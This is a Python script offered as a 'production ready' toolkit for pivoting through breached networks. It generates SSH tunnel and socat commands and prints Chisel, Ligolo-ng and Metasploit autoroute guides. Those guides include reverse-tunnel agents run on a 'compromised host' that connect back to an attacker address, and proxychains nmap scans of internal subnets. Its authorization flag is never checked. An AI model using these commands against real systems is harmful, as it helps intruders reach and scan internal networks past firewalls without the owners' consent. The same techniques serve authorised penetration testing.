#!/usr/bin/env python3
"""
Advanced Network Pivoting - Production Ready
SSH tunneling, SOCKS proxies, port forwarding, beacon chaining
"""

import argparse
import logging
import subprocess
import json
import os
import sys
import socket
import threading

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class NetworkPivoting:
    """Production-ready network pivoting toolkit"""
    
    def __init__(self):
        self.active_tunnels = []
        self.socks_proxies = []
        
    def ssh_local_port_forward(self, ssh_host, ssh_user, local_port, 
                               remote_host, remote_port, ssh_key=None):
        """SSH local port forwarding (access remote service locally)"""
        logger.info(f"SSH local port forward: localhost:{local_port} -> {remote_host}:{remote_port}")
        
        key_arg = f'-i {ssh_key}' if ssh_key else ''
        cmd = f"ssh -L {local_port}:{remote_host}:{remote_port} {ssh_user}@{ssh_host} {key_arg} -N"
        
        logger.info(f"Command: {cmd}")
        logger.info(f"Access remote service at: localhost:{local_port}")
        logger.info("Example: curl http://localhost:{local_port}")
        
        return {
            'type': 'local_forward',
            'local': f'localhost:{local_port}',
            'remote': f'{remote_host}:{remote_port}',
            'ssh_server': ssh_host,
            'command': cmd
        }
    
    def ssh_remote_port_forward(self, ssh_host, ssh_user, remote_port, 
                                local_host, local_port, ssh_key=None):
        """SSH remote port forwarding (expose local service remotely)"""
        logger.info(f"SSH remote port forward: {ssh_host}:{remote_port} -> {local_host}:{local_port}")
        
        key_arg = f'-i {ssh_key}' if ssh_key else ''
        cmd = f"ssh -R {remote_port}:{local_host}:{local_port} {ssh_user}@{ssh_host} {key_arg} -N"
        
        logger.info(f"Command: {cmd}")
        logger.info(f"Remote server can access local service at: localhost:{remote_port}")
        
        return {
            'type': 'remote_forward',
            'local': f'{local_host}:{local_port}',
            'remote': f'{ssh_host}:{remote_port}',
            'command': cmd
        }
    
    def ssh_dynamic_port_forward(self, ssh_host, ssh_user, local_port=1080, ssh_key=None):
        """SSH dynamic port forwarding (SOCKS5 proxy)"""
        logger.info(f"SSH dynamic port forward (SOCKS5): localhost:{local_port}")
        
        key_arg = f'-i {ssh_key}' if ssh_key else ''
        cmd = f"ssh -D {local_port} {ssh_user}@{ssh_host} {key_arg} -N"
        
        logger.info(f"Command: {cmd}")
        logger.info(f"SOCKS5 proxy available at: 127.0.0.1:{local_port}")
        logger.info("Configure tools to use this proxy")
        logger.info(f"  Firefox: Preferences -> Network -> Manual proxy -> SOCKS Host: 127.0.0.1 Port: {local_port}")
        logger.info(f"  proxychains: edit /etc/proxychains.conf, add: socks5 127.0.0.1 {local_port}")
        
        return {
            'type': 'dynamic_forward',
            'socks_proxy': f'127.0.0.1:{local_port}',
            'ssh_server': ssh_host,
            'command': cmd,
            'usage': f'proxychains <tool> <args>'
        }
    
    def ssh_jump_host(self, jump_host, jump_user, target_host, target_user, 
                     local_port, remote_port, ssh_key=None):
        """SSH through jump host (bastion)"""
        logger.info(f"SSH through jump host: {jump_host} -> {target_host}")
        
        key_arg = f'-i {ssh_key}' if ssh_key else ''
        cmd = f"ssh -J {jump_user}@{jump_host} -L {local_port}:localhost:{remote_port} {target_user}@{target_host} {key_arg} -N"
        
        logger.info(f"Command: {cmd}")
        logger.info(f"Access target service at: localhost:{local_port}")
        
        return {
            'type': 'jump_host',
            'jump_host': jump_host,
            'target_host': target_host,
            'local_port': local_port,
            'command': cmd
        }
    
    def proxychains_config(self, proxy_type='socks5', proxy_host='127.0.0.1', 
                          proxy_port=1080):
        """Generate proxychains configuration"""
        logger.info("Generating proxychains configuration...")
        
        config = f"""
# Proxychains configuration for pivoting
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
{proxy_type} {proxy_host} {proxy_port}
"""
        
        config_path = '/tmp/proxychains.conf'
        with open(config_path, 'w') as f:
            f.write(config)
        
        logger.info(f"Proxychains config saved to: {config_path}")
        logger.info(f"Usage: proxychains4 -f {config_path} nmap -sT 192.168.10.0/24")
        
        return config_path
    
    def chisel_server_setup(self, listen_port=8080):
        """Chisel reverse proxy server setup"""
        logger.info("Chisel - Fast TCP/UDP tunnel over HTTP")
        
        setup_guide = f"""
# Chisel Server Setup (Attacker Machine)

1. Download Chisel:
   wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_linux_amd64.gz
   gunzip chisel_1.9.1_linux_amd64.gz
   chmod +x chisel_1.9.1_linux_amd64
   mv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel

2. Start Chisel Server:
   chisel server --reverse --port {listen_port}

3. Chisel Client (Compromised Host):
   # SOCKS proxy
   chisel client <ATTACKER_IP>:{listen_port} R:socks
   
   # Port forward (RDP example)
   chisel client <ATTACKER_IP>:{listen_port} R:3389:<INTERNAL_IP>:3389

4. Use SOCKS proxy:
   proxychains4 -f /etc/proxychains.conf <tool>

Features:
• Encrypted tunnel over HTTP/HTTPS
• Reverse connections (bypass firewalls)
• Multiple port forwards
• SOCKS5 proxy
• Fast and lightweight
"""
        
        print(setup_guide)
        
        return {
            'tool': 'chisel',
            'port': listen_port,
            'github': 'https://github.com/jpillora/chisel'
        }
    
    def socat_port_forward(self, listen_port, target_host, target_port):
        """Socat port forwarding setup"""
        logger.info(f"Socat port forward: 0.0.0.0:{listen_port} -> {target_host}:{target_port}")
        
        cmd = f"socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{target_host}:{target_port}"
        
        logger.info(f"Command: {cmd}")
        logger.info("Socat features:")
        logger.info("  • Bidirectional data transfer")
        logger.info("  • Protocol converter")
        logger.info("  • Port forwarding")
        logger.info("  • File descriptor handling")
        
        return {
            'tool': 'socat',
            'listen': f'0.0.0.0:{listen_port}',
            'target': f'{target_host}:{target_port}',
            'command': cmd
        }
    
    def metasploit_autoroute(self, subnet):
        """Metasploit autoroute for pivoting"""
        logger.info(f"Metasploit autoroute setup for subnet: {subnet}")
        
        msf_commands = f"""
# Metasploit Pivoting with Autoroute

1. Get Meterpreter session:
   meterpreter > background

2. Add route:
   msf6 > use post/multi/manage/autoroute
   msf6 post(multi/manage/autoroute) > set SESSION 1
   msf6 post(multi/manage/autoroute) > set SUBNET {subnet}
   msf6 post(multi/manage/autoroute) > run

3. Verify routes:
   msf6 > route print

4. Use SOCKS proxy module:
   msf6 > use auxiliary/server/socks_proxy
   msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
   msf6 auxiliary(server/socks_proxy) > set VERSION 5
   msf6 auxiliary(server/socks_proxy) > run -j

5. Configure proxychains:
   # /etc/proxychains.conf
   socks5 127.0.0.1 1080

6. Scan through pivot:
   proxychains nmap -sT -Pn {subnet}
"""
        
        print(msf_commands)
        
        return {
            'tool': 'metasploit_autoroute',
            'subnet': subnet,
            'socks_port': 1080
        }
    
    def ligolo_ng_setup(self):
        """Ligolo-ng setup for pivoting"""
        logger.info("Ligolo-ng - Advanced tunneling tool")
        
        setup_guide = """
# Ligolo-ng Setup (Modern SSH alternative)

1. Download Ligolo-ng:
   # Server (attacker)
   wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
   tar -xzf ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
   
   # Agent (compromised host)
   wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_Windows_64bit.zip

2. Setup TUN interface (attacker):
   sudo ip tuntap add user $(whoami) mode tun ligolo
   sudo ip link set ligolo up

3. Start Proxy (attacker):
   ./proxy -selfcert

4. Start Agent (compromised host):
   agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert

5. In Ligolo console:
   ligolo-ng » session
   ligolo-ng » start
   
6. Add route (attacker):
   sudo ip route add 192.168.0.0/24 dev ligolo

7. Access internal network:
   nmap 192.168.0.0/24
   curl http://192.168.0.10

Features:
• Layer 3 tunneling (no SOCKS needed)
• Encrypted connections
• Multiple agents
• Port forwarding
• Listener pivoting
"""
        
        print(setup_guide)
        
        return {
            'tool': 'ligolo-ng',
            'github': 'https://github.com/nicocha30/ligolo-ng'
        }
    
    def generate_pivoting_report(self):
        """Generate network pivoting report"""
        report = {
            'tunneling_methods': {
                'ssh': {
                    'local_forward': 'Access remote service locally',
                    'remote_forward': 'Expose local service remotely',
                    'dynamic_forward': 'SOCKS5 proxy',
                    'jump_host': 'Multi-hop SSH'
                },
                'chisel': {
                    'description': 'Fast TCP/UDP tunnel over HTTP',
                    'features': ['Reverse connections', 'SOCKS5', 'Encrypted']
                },
                'ligolo-ng': {
                    'description': 'Layer 3 tunneling tool',
                    'features': ['TUN interface', 'Multiple agents', 'No SOCKS']
                },
                'socat': {
                    'description': 'Swiss army knife for port forwarding',
                    'features': ['Bidirectional', 'Protocol converter']
                },
                'metasploit': {
                    'description': 'Autoroute + SOCKS proxy',
                    'features': ['Meterpreter integration', 'Route management']
                }
            },
            'use_cases': {
                'internal_network_access': 'SSH dynamic forward + proxychains',
                'rdp_pivoting': 'SSH local forward or Chisel',
                'multi_hop': 'SSH jump host or Ligolo-ng',
                'reverse_connection': 'Chisel reverse mode',
                'layer_3_tunneling': 'Ligolo-ng with TUN interface'
            },
            'tools_comparison': {
                'ssh': 'Universal, built-in, easy to use',
                'chisel': 'Fast, reverse mode, HTTP-based',
                'ligolo-ng': 'Modern, layer 3, no proxy needed',
                'metasploit': 'Integrated with exploit framework',
                'socat': 'Flexible, powerful, lightweight'
            }
        }
        
        report_file = 'network_pivoting_report.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Network pivoting report saved to {report_file}")
        return report_file


def main():
    parser = argparse.ArgumentParser(description='Advanced Network Pivoting Toolkit')
    parser.add_argument('--ssh-local', nargs=5, metavar=('SSH_HOST', 'SSH_USER', 'LOCAL_PORT', 'REMOTE_HOST', 'REMOTE_PORT'),
                       help='SSH local port forward')
    parser.add_argument('--ssh-remote', nargs=5, metavar=('SSH_HOST', 'SSH_USER', 'REMOTE_PORT', 'LOCAL_HOST', 'LOCAL_PORT'),
                       help='SSH remote port forward')
    parser.add_argument('--ssh-dynamic', nargs=2, metavar=('SSH_HOST', 'SSH_USER'),
                       help='SSH dynamic port forward (SOCKS5)')
    parser.add_argument('--ssh-jump', nargs=6, metavar=('JUMP_HOST', 'JUMP_USER', 'TARGET_HOST', 'TARGET_USER', 'LOCAL_PORT', 'REMOTE_PORT'),
                       help='SSH through jump host')
    parser.add_argument('--proxychains-config', action='store_true', help='Generate proxychains config')
    parser.add_argument('--chisel-setup', action='store_true', help='Chisel setup guide')
    parser.add_argument('--socat', nargs=3, metavar=('LISTEN_PORT', 'TARGET_HOST', 'TARGET_PORT'),
                       help='Socat port forward')
    parser.add_argument('--metasploit-autoroute', help='Metasploit autoroute setup (subnet)')
    parser.add_argument('--ligolo-setup', action='store_true', help='Ligolo-ng setup guide')
    parser.add_argument('--report', action='store_true', help='Generate pivoting report')
    parser.add_argument('--authorized', action='store_true',
                       help='Confirm you have authorization to perform this action')
    args = parser.parse_args()
    
    pivoting = NetworkPivoting()
    
    print("=" * 70)
    print("ADVANCED NETWORK PIVOTING TOOLKIT")
    print("=" * 70)
    print("\nSupported Methods:")
    print("• SSH Tunneling (Local, Remote, Dynamic, Jump Host)")
    print("• Chisel - Fast TCP/UDP over HTTP")
    print("• Ligolo-ng - Modern layer 3 tunneling")
    print("• Socat - Swiss army knife for port forwarding")
    print("• Metasploit Autoroute + SOCKS")
    print("\nFeatures:")
    print("• Multi-hop pivoting")
    print("• SOCKS5 proxy support")
    print("• Reverse connections")
    print("• Encrypted tunnels")
    print("=" * 70)
    
    if args.ssh_local:
        result = pivoting.ssh_local_port_forward(*args.ssh_local)
        print(f"\nSSH Local Forward: {json.dumps(result, indent=2)}")
    
    if args.ssh_remote:
        result = pivoting.ssh_remote_port_forward(*args.ssh_remote)
        print(f"\nSSH Remote Forward: {json.dumps(result, indent=2)}")
    
    if args.ssh_dynamic:
        result = pivoting.ssh_dynamic_port_forward(*args.ssh_dynamic)
        print(f"\nSSH Dynamic Forward (SOCKS5): {json.dumps(result, indent=2)}")
    
    if args.ssh_jump:
        result = pivoting.ssh_jump_host(*args.ssh_jump)
        print(f"\nSSH Jump Host: {json.dumps(result, indent=2)}")
    
    if args.proxychains_config:
        config = pivoting.proxychains_config()
        print(f"\nProxychains config: {config}")
    
    if args.chisel_setup:
        pivoting.chisel_server_setup()
    
    if args.socat:
        result = pivoting.socat_port_forward(*[int(args.socat[0]), args.socat[1], int(args.socat[2])])
        print(f"\nSocat: {json.dumps(result, indent=2)}")
    
    if args.metasploit_autoroute:
        pivoting.metasploit_autoroute(args.metasploit_autoroute)
    
    if args.ligolo_setup:
        pivoting.ligolo_ng_setup()
    
    if args.report:
        pivoting.generate_pivoting_report()
    
    if len(sys.argv) == 1:
        parser.print_help()


if __name__ == '__main__':
    main()
